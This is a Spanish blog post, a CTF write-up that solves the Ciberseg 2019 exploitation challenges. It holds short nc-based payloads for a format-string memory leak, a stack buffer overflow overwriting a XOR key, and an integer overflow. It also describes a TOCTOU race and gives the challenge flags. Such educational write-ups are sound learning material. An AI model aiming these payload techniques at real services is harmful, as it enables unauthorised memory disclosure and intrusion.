---
layout: post
title:  "Ciberseg 2019: explotación"
date:	2019-01-27 11:27:51 +0100
author: foo
categories: es ctf ciberseg write-up exploiting
lang: es
ref: ciberseg-2019-exploiting
---


En este post voy a explicar mis soluciones a los retos del Ciberseg de 2019. En concreto,
este artículo se corresponde con los de la categoría de **explotación**.

El [Ciberseg](https://ciberseg.uah.es/) es un congreso que tiene lugar todos los años por
estas fechas en la Universidad de Alcalá de Henares. La verdad es que los años anteriores
siempre ha sido divertido, y este año no ha sido menos :) Además, el podio ha estado muy
reñido y hubo sorpresas de última hora :D (al final gané en la última hora,
literalmente, por apenas unos pocos puntitos).


En fin, estos son los retos y sus soluciones. Lamentablemente, estos retos eran todos
remotos; así que no dispongo de los recursos para poder montarse los retos y resolverlos
por vuestra cuenta.

-----------------------------------------------------------------------------------------

# 1.- Loro (100 puntos)

La descripción de este reto dice así:

> Hemos contratado a un loro para que gestione las flags. Lo tenemos viviendo en el
> puerto 2323


Este reto consistía en un programa que repetía exactamente lo que se enviaba. El problema
es que no está bien escrito y no repite _exactamente_ lo que se le envía. Por ejemplo, si
se envía `%p` devuelve cosas como _(nil)_, _0x8485632_... Es decir, que es vulnerable a
la explotación por cadenas de formato (_format strings_).

Para conseguir la bandera, simplemente hay que ir sacando el contenido de la memoria
hasta conseguir la _flag_. Por ejemplo, me hice este script:
```sh
#!/bin/bash

for i in {1..20}
do
	printf "\n ---- %3d ---- \n" "$i"
	echo -e "AAAABBBB-%$i\$s\n" | nc ctf.alphasec.xyz 2323
done
```

Al intento diez u once aparece nuestra bandera: `flag{passwordseña_dude}`.

-----------------------------------------------------------------------------------------

# 2.- Xorizo (125 puntos)

La descripción de este reto dice:

> Hicimos el programa definitivo para superar estructuras discretas, pero al poner la contraseña, no conseguimos que descifre el secreto. La contraseña es "estructurasdiscretasjeje", pero al introducirla nos saca algo incomprensible...
>
> Este es el código:
>
> void main(){
>
> char pass[24] = "xxxxxxxxxxxxxxxxxxxxxxxx";
> char x[10];
>
> char flag[24] = ...;
>
> char* res = malloc(24);
>
> scanf("%s", x);
> printf("%s\n", pass);
>
> int i;
> for(i = 0; i < 24; i++)
> res = pass ^ flag;
>
> printf("%s\n", res);
>
>
> }
>
>
> ¿Nos echas una mano? Está corriendo en ctf.alphasec.xyz:2424``



Al conectarnos, nos pedía una contraseña y luego imprimía una cadena con cosas que
parecían basura. Sin embargo, si se ponen más de 10 caracteres, esta cadena que se
imprime cambia. Como tenemos el código, podemos comprobar que se produce un
_buffer overflow_:
{% highlight C linenos %}
void main ()
{
	char pass [24] = "xxxxxxxxxxxxxxxxxxxxxxxx";
	char x [10];

	char flag [24] = ...;

	char* res = malloc (24);

==>	scanf ("%s", x);	/* OVERFLOW! No se comprueba que quepan en X */
	printf ("%s\n", pass);

	int i;
	for (i = 0; i < 24; i++)
		res = pass ^ flag;

	printf ("%s\n", res);
}
{% endhighlight %}


Como se muestra en la línea marcada (**:10**), se copia lo que venga por pantalla sin
comprobar que quepan en la variable _x_, que sólo tiene espacio para 10 Bytes (9
caracteres más el delimitador de fin de cadena, _0x00_). Una vez hemos rebasado la
variable _x_, podemos sobrescribir el contenido de _pass_.

Como luego se hace una XOR entre la variable _pass_ y la _flag_, podemos manipular los
valores para sacar el valor original de la bandera. Pero... ¿cuáles son los valores
apropiados para _pass_?

Deducimos que el valor de _pass_ se sacó calculando <img src="https://latex.codecogs.com/svg.latex?\fn_cm%20flag%20\oplus%20pass" class="inline-math" alt="flag \oplus pass">.
Sabiendo esto, nos podemos basar en que <img src="https://latex.codecogs.com/svg.latex?\fn_cm%20\left(%20flag%20\oplus%20pass%20\right)%20\oplus%20pass%20=%20flag" class="inline-math" alt="\left( flag \oplus pass \right) \oplus pass = flag">
para darle a _pass_ el valor `estructurasdiscretasjeje` y nos sacaría el valor original de _flag_.

Juntándolo todo, nuestro _exploit_ sería algo como esto:
```sh
printf "0123456789estructurasdiscretasjeje\n" | nc ctf.alphasec.xyz 2424
```

Y sacamos la _flag_: `flag{lohacehastaunperro}`

-----------------------------------------------------------------------------------------

# 3.- Numerao, numerao... (150 puntos)

La descripción de este reto dice:
> ¡Viva la numeración!
>
> En ctf.alphasec.xyz:2525 tenemos un sistema que sólo acepta a los números positivos,
> pero sobre todo le tiene tirria a los ceros. Si tras operar con las entradas obtuviese
> un 0... No queremos imaginarnos qué resultado catástrofico podría tener.

El servicio corriendo en el puerto 2525 pide tres números y luego devuelve su suma.
Claramente, en este reto la intención es forzar un desbordamiento del tipo de dato para
que los números sean negativos. En concreto, se trata de un _int overflow_: si ponemos un
número mayor a <img src="https://latex.codecogs.com/svg.latex?\fn_cm%20\frac%20{2^{32}}{2}%20-%201%20=%202147483647" class="inline-math" alt="\fn_cm \frac {2^{32}}{2} - 1 = 2147483647">
podemos jugar con los tres operandos hasta obtener 0.

Al final los valores que usé fueron **2147483647**, **2147483647** y **2**:
```sh
echo -e "2147483647\n2147483647\n2" | nc ctf.alphasec.xyz 2525
```

Cuando conseguimos que la suma sea cero, nos devuelve la _flag_: `flag{pavoreal_uuu}`.


-----------------------------------------------------------------------------------------

# 4.- Corre Chicote (200 puntos)

Este fue el único reto que no conseguí terminar; pero se trataba de explotar la condición
de carrera TOCTOU (_Time Of Check - Time Of Use_). Os dejo por aquí
[el _gist_ de @KaoRz](https://gist.github.com/KaoRz/44ed827c258054577fc59cd70a9f381d),
que sí consiguió sacarlo.

El código es bastante sencillo de entender: básicamente hay que acceder (por HTTP) a los
recursos `/verify` y `/read` de manera simultánea hasta conseguir leer la bandera.

-----------------------------------------------------------------------------------------

Y ya está. Estos retos eran más cortitos que los de criptología.

Siempre me lo paso bien con los retos del Ciberseg, y este año no ha sido menos. Espero
poder competir el año que viene, que seguro que se superan otra vez.

También quiero dar mi enhorabuena a los organizadores por todo su esfuerzo y su
creatividad para crear retos fuera de lo común :D
